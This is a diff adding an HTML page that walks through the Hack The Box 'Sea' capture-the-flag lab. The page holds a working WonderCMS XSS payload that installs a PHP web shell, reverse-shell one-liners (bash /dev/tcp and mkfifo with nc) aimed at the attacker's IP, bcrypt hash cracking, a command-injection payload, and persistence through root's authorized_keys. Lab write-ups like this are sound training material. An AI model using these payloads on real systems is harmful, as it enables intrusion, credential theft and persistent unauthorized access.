@@ -1,0 +1,431 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Sea</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 4.1</p>
+    <h2 class="subtitle">Enumearation</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
+|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
+|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Sea - Home</code></pre></div>
+
+
+<p class="text">HTTP server is open on the target machine PORT 80. i will add domain name to /etc/hosts and see what's there.</p>
+
+<div class="code-box"><pre><code>└─$ echo 'IP sea.htb' | sudo tee -a /etc/hosts</code></pre></div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sea/1-home.png' %}" alt="">
+    <p class="text">There is no interesting location. Let's browse this website randomly.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sea/2-contact.png' %}" alt="">
+    <p class="text">When I opened <u>HOW TO PARTICIPATE</u> page on the home page, there was a href which navigate us to <u>contact.php</u>. However, I couldn't implement any exploitation. <br><br>I'll keep it in my mind and step to next phase.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://sea.htb -t 70</u>
+===============================================================
+/.htaccess            (Status: 403) [Size: 199]
+/.htpasswd            (Status: 403) [Size: 199]
+/0                    (Status: 200) [Size: 3680]
+/404                  (Status: 200) [Size: 3371]
+/Documents and Settings (Status: 403) [Size: 199]
+/Program Files        (Status: 403) [Size: 199]
+/contact us           (Status: 403) [Size: 199]
+/data                 (Status: 301) [Size: 234] [--&gt; http://10.129.181.35/data/]
+/donate cash          (Status: 403) [Size: 199]
+/external files       (Status: 403) [Size: 199]
+/home page            (Status: 403) [Size: 199]
+/home                 (Status: 200) [Size: 3680]
+/messages             (Status: 301) [Size: 238] [--&gt; http://10.129.181.35/messages/]
+/modern mom           (Status: 403) [Size: 199]
+/my project           (Status: 403) [Size: 199]
+/neuf giga photo      (Status: 403) [Size: 199]
+/planned giving       (Status: 403) [Size: 199]
+/plugins              (Status: 301) [Size: 237] [--&gt; http://10.129.181.35/plugins/]
+/press releases       (Status: 403) [Size: 199]
+/privacy policy       (Status: 403) [Size: 199]
+/reports list         (Status: 403) [Size: 199]
+/server-status        (Status: 403) [Size: 199]
+/site map             (Status: 403) [Size: 199]
+/style library        (Status: 403) [Size: 199]
+/themes               (Status: 301) [Size: 236] [--&gt; http://10.129.181.35/themes/]
+/web references       (Status: 403) [Size: 199]
+
+===============================================================</code></pre></div>
+
+
+<p class="text">Though there are many outputs, just four directory <u>data, messages, plugins, and themes</u> are interesting. I will emumerate dirs of them with feroxbuster.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>feroxbuster -u http://sea.htb/data</u>
+403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+
+404      GET       84l      209w     3341c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+
+301      GET        7l       20w      228c http://sea.htb/data => http://sea.htb/data/
+
+301      GET        7l       20w      234c http://sea.htb/data/files => http://sea.htb/data/files/</code></pre></div>
+
+<p class="text">No output worth noting.</p>
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ feroxbuster -u http://sea.htb/plugins
+404      GET       84l      209w     3341c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+
+403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+
+301      GET        7l       20w      231c http://sea.htb/plugins => http://sea.htb/plugins/</code></pre></div>
+
+<p class="text">As the same, no interesting output.</p>
+
+<div class="code-box"><pre><code>└─$ feroxbuster -u http://sea.htb/themes/
+404      GET       84l      209w     3341c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+
+403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+
+301      GET        7l       20w      230c http://sea.htb/themes => http://sea.htb/themes/
+
+301      GET        7l       20w      235c http://sea.htb/themes/bike => http://sea.htb/themes/bike/
+
+301      GET        7l       20w      239c http://sea.htb/themes/bike/img => http://sea.htb/themes/bike/img/
+
+301      GET        7l       20w      239c http://sea.htb/themes/bike/css => http://sea.htb/themes/bike/css/</code></pre></div>
+
+
+<p class="text">It returned new directory named <u>bike</u>. However, there is no files or deeper directory somehow. It's possible that the wordlist is incompatible with target directory. Let's use other wordlist and enumerate new revealed directories.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 70</u>
+===============================================================
+/.hta                 (Status: 403) [Size: 199]
+/.htaccess            (Status: 403) [Size: 199]
+/.htpasswd            (Status: 403) [Size: 199]
+/404                  (Status: 200) [Size: 3341]
+/Documents and Settings (Status: 403) [Size: 199]
+/LICENSE              (Status: 200) [Size: 1067]
+/Program Files        (Status: 403) [Size: 199]
+/css                  (Status: 301) [Size: 239] [--&gt; http://sea.htb/themes/bike/css/]
+/home                 (Status: 200) [Size: 3650]
+/img                  (Status: 301) [Size: 239] [--&gt; http://sea.htb/themes/bike/img/]
+/reports list         (Status: 403) [Size: 199]
+/summary              (Status: 200) [Size: 66]
+/version              (Status: 200) [Size: 6]
+
+===============================================================</code></pre></div>
+
+<p class="text">It returned <u>LICENSE</u>, but no others.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sea/3-license.png' %}" alt="">
+    <p class="text">Only information I could access here was 'MIT License <br>
+
+Copyright (c) 2019 <u>turboblack</u>'. <br> Idk whether we can get good result, but let's google it.</p>
+</div>
+
+
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/sea/4-google.png' %}" alt="">
+    <p class="text">Keyword <u>'MIT turboblack lisence'</u> revealed <u>WonderCMS</u>. Also, researching keyword 'WonderCMS vulnerability' revealed CVE existance : <a href="CVE-2023-41425">CVE-2023-41425</a>. It seems to include XSS vulnerability.</p>
+</div>
+
+<p class="text">There was a <a href="https://github.com/prodigiousMind/CVE-2023-41425/tree/main">poc here</a>. This page says there is a XSS vulnerability in page query in <u>index.php?loginUR</u>L. Let's try it.</p>
+
+
+<div class="code-box"><pre><code>└─$ git clone https://github.com/prodigiousMind/CVE-2023-41425.git</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>cd CVE*</u>
+└─$ <u>python3 exploit.py </u>                                                  
+usage: python3 exploit.py loginURL IP_Address Port
+example: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252
+
+└─$ <u>python3 exploit.py http://sea.htb/index.php?page=loginURL 10.10.16.40 4444</u>
+[+] xss.js is created
+[+] execute the below command in another terminal
+
+----------------------------
+nc -lvp 4444
+----------------------------
+
+send the below link to admin:
+
+----------------------------
+http://sea.htb/index.php?page=loginURL">&lt;/form>&lt;script+src="http://10.10.16.40:8000/xss.js">&lt;/script>&lt;form+action="
+----------------------------
+
+
+starting HTTP server to allow the access to xss.js
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre></div>
+
+
+<p class="text">Then, we have to send link to admin, but there is no way to do that. Only 'can be' stuff is <u>contact.php</u> page where has <u>Website</u> column.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sea/5-form.png' %}" alt="">
+    <p class="text">Set this link to website column, and open port with <br> <br><code>nc -lvnp 4444</code> <br>and hit press.</p>
+</div>
+
+
+<p class="text">However, though it received GET request from target website, it doesn't return reverse shell. We might have to repair this payload somehow.</p>
+
+<div class="code-box"><pre><code>var url = "http://sea.htb/index.php?page=loginURL";
+if (url.endsWith("/")) {
+ url = url.slice(0, -1);
+}
+var urlWithoutLog = url.split("/").slice(0, -1).join("/");
+var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
+var token = document.querySelectorAll('[name="token"]')[0].value;
+var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
+var xhr3 = new XMLHttpRequest();
+xhr3.withCredentials = true;
+xhr3.open("GET", urlRev);
+xhr3.send();
+xhr3.onload = function() {
+ if (xhr3.status == 200) {
+   var xhr4 = new XMLHttpRequest();
+   xhr4.withCredentials = true;
+   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
+   xhr4.send();
+   xhr4.onload = function() {
+     if (xhr4.status == 200) {
+       var ip = "10.10.16.40";
+       var port = "4444";
+       var xhr5 = new XMLHttpRequest();
+       xhr5.withCredentials = true;
+       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
+       xhr5.send();
+       
+     }
+   };
+ }
+};</code></pre></div>
+
+<p class="text">Because I'm not good programmar in JavaScript, I will use console in Inspect tool to observe how the payload works.</p>
+
+<p class="text">The url variables are suspicious.</p>
+
+<p class="text">Copy and paste codes below...</p>
+<div class="code-box"><pre><code>var url = "http://sea.htb/index.php?page=loginURL";
+if (url.endsWith("/")) {
+ url = url.slice(0, -1);
+}
+var urlWithoutLog = url.split("/").slice(0, -1).join("/");
+var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
+var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token="</code></pre></div>
+
+<p class="text"><u>Remove token segments because we have no token in inspector.</u></p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sea/6-console.png' %}" alt="">
+    <p class="text">Output of <u>console.log(urlWithoutLogBase)</u> let us know the new constructed url <u>urlRev</u> becames <u>//?installModule=...</u>, which is totally broken. Also, to prevent from occuring additional problem, I can modify this payload.</p>
+</div>
+
+<p class="text">I want to make it more simple, so I will create my revshell and use it.</p>
+
+<div class="code-box"><pre><code>└─$ <u>mkdir rev</u>
+└─$ <u>cd rev</u>
+└─$ <u>echo '&lt;?php system($_REQUEST['cmd']);?>' > rev.php</u>
+└─$ <u>cd ..</u>
+└─$ <u>zip -r rev.zip rev</u></code></pre></div>
+
+<p class="text">I removed xss.jss created automatically and replace codes with below.</p>
+<div class="code-box"><pre><code>var url = "http://sea.htb/index.php?page=LoginURL";
+if (url.endsWith("/")) {
+ url = url.slice(0, -1);
+}
+var urlWithoutLog = url.split("/").slice(0, -1).join("/");
+var urlWithoutLogBase = '<u>http://sea.htb</u>'; 
+var token = document.querySelectorAll('[name="token"]')[0].value;
+var urlRev = urlWithoutLogBase+"/?installModule=<u>http://10.10.16.40:8000/rev.zip</u>&directoryName=violet&type=themes&token=" + token;
+var xhr3 = new XMLHttpRequest();
+xhr3.withCredentials = true;
+xhr3.open("GET", urlRev);
+xhr3.send();
+xhr3.onload = function() {
+ if (xhr3.status == 200) {
+   var xhr4 = new XMLHttpRequest();
+   xhr4.withCredentials = true;
+   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
+   xhr4.send();
+   xhr4.onload = function() {
+     if (xhr4.status == 200) {
+       var ip = "10.10.16.40";
+       var listeningPort = "4444";
+       var xhr5 = new XMLHttpRequest();
+       xhr5.withCredentials = true;
+       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + listeningPort);
+       xhr5.send();
+       
+     }
+   };
+ }
+};</code></pre></div>
+
+<p class="text">It's ok whatever happen after uploading rev.php, so we don't need to modify code largely.</p>
+
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000
+<u class="green">#and send contact form as the same with before...</u>
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.170.188 - - [10/Oct/2025 08:22:42] "GET /xss.js HTTP/1.1" 200 -
+10.129.170.188 - - [10/Oct/2025 08:22:47] "GET /rev.zip HTTP/1.1" 200 -
+10.129.170.188 - - [10/Oct/2025 08:22:49] "GET /rev.zip HTTP/1.1" 200 -
+10.129.170.188 - - [10/Oct/2025 08:22:51] "GET /rev.zip HTTP/1.1" 200 -
+10.129.170.188 - - [10/Oct/2025 08:22:51] "GET /rev.zip HTTP/1.1" 200 -</code></pre></div>
+<p class="text">This time, rev.zip is requested. This file might be stored in http://sea.htb/themes/revshell-main/rev.php.</p>
+
+
+<div class="code-box"><pre><code>└─$ curl http://sea.htb/themes/rev/rev.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+└─$ <u>nc -lvnp 4444</u>
+└─$ curl -s -G 'http://sea.htb/themes/rev/rev.php' --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.40/4444 0>&1"'
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.170.188] 33508
+bash: cannot set terminal process group (1125): Inappropriate ioctl for device
+bash: no job control in this shell
+<u>www-data@sea:/var/www/sea/themes/rev$ </u></code></pre></div>
+
+
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<p class="text">Becuase the user is www-data, we have to find a way to get home user.</p>
+
+<div class="code-box"><pre><code>www-data@sea:/var/www/sea/themes/rev$ ls /home
+amay  geo</code></pre></div>
+
+<p class="text">There are two users amay and geo.</p>
+
+
+<div class="code-box"><pre><code>www-data@sea:/var/www/sea/data$ ls
+cache.json  database.js  files</code></pre></div>
+
+<p class="text">Browing website's directory revealed interesting file <u>database.js</u>. </p>
+
+<div class="code-box"><pre><code>www-data@sea:/var/www/sea/data$ cat database.js | grep password
+        "password": "<u>$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q</u>",</code></pre></div>
+
+<p class="text">Grepping keyword 'password' returned hashed password. We might be able to use this for lateral movement. Googling '$2y hash' returned result 'bycrypt'. Remove these escape sequences <u>\</u> and decode it with hashcat.</p>
+
+<div class="code-box"><pre><code>└─$ echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash
+└─$ hashcat hash /usr/share/wordlists/rockyou.txt -m 3200
+...
+$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:<u>mychemicalromance</u></code></pre></div>
+
+
+<p class="text">Let's test this password.</p>
+
+<div class="code-box"><pre><code>└─$ <u>ssh amay@sea.htb</u>
+...
+amay@sea:~$ </code></pre>
+</div>
+
+
+<p class="text">We got user amay.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<div class="code-box"><pre><code>amay@sea:~$ sudo -l
+[sudo] password for amay: 
+Sorry, user amay may not run sudo on sea.</code></pre></div>
+
+<p class="text">Amay doesn't have sudo privilege.</p>
+
+
+<div class="code-box"><pre><code>amay@sea:~$ netstat -tulnp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:47555         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 <u>127.0.0.1:8080</u>          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*    </code></pre></div>
+
+
+<p class="text">netstat revealed locally open port. Let's establish tunnel and see what's there.</p>
+
+<div class="code-box"><pre><code>└─$ sshpass -p 'mychemicalromance' ssh -L 4444:localhost:8080 amay@sea.htb</code></pre></div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sea/7-login.png' %}" alt="">
+    <p class="text">Openning http with <u>http://localhost:4444</u> returned login form. Trying credential <u>amay | mychemicalromance</u> let me in.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sea/8-8080.png' %}" alt="">
+    <img src="{% static 'EthHack/images/sea/9-analyze.png' %}" alt="">
+</div>
+
+
+<p class="text">Hitting 'analyze' button returns log from access.log. As this site says it's under developing, this function may be connected with linux command line, like 'cat /?..?/access.log'. Let's see what will happen if we change some parameter with burpsuite.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sea/10-rev.png' %}" alt="">
+    <img src="{% static 'EthHack/images/sea/11-rev.png' %}" alt="">
+</div>
+
+
+<p class="text">When I tried simple command injection : ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.40 4444 >/tmp/f with url encode, it returned reverse shell. Though it terminate shell, we can merely send one command. </p>
+
+
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.181.35] 44300
+sh: 0: can't access tty; job control turned off
+# cat /root/root.txt
+77a040a.....f643e00</code></pre></div>
+
+<p class="text">I sent cat command for /root/root.txt as soon as I get reverse shell and got root flag. </p>
+
+<p class="text">Additionally, we can add our public key to /root/.ssh/authorized_keys and establish ssh connection with root.</p>
+
+
+
+<div class="code-box"><pre><code>└─$ <u>ssh-keygen</u>
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_ed25519): <u class="green">You can leave empty...</u></code></pre></div>
+
+<p class="text">Then, send reverse shell command to target system following the same steps and ...</p>
+<div class="code-box"><pre><code>└─$ <u>python3 -m http.server 8000</u> <u class="green">#execute code on the dir generated public key placed</u>
+└─$ <u>nc -lvnp 443</u>
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.181.35] 44300
+sh: 0: can't access tty; job control turned off
+# curl http://10.10.16.40:8000/id_ed25519.pub >> /root/.ssh/authorized_keys</code></pre></div>
+
+<p class="text">Then, we can establish ssh conneciton with root user.</p>
+
+
+</body>
+</html>
